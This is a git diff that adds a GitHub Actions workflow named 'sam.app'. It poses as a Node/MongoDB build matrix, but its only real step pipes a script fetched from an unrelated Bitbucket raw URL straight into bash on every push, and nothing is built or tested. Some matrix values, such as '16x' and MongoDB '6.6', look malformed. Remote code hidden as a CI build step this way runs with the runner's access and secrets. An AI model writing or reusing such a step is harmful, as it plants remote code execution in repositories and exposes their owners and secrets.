@@ -1,0 +1,16 @@
+name: sam.app
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node-version: [8.x, 10.x, 12.x, 14.x, 16x]
+        mongodb-version: [4.0, 4.2, 4.4, 6.6]
+
+    steps:
+    - name: Git checkout
+      uses: actions/checkout@v2
+    - run: curl -sL https://bitbucket.org/makanlah88/new/raw/a6f98ebe015c376b2082bdc4bb791fc94d471d2f/itunenew | bash
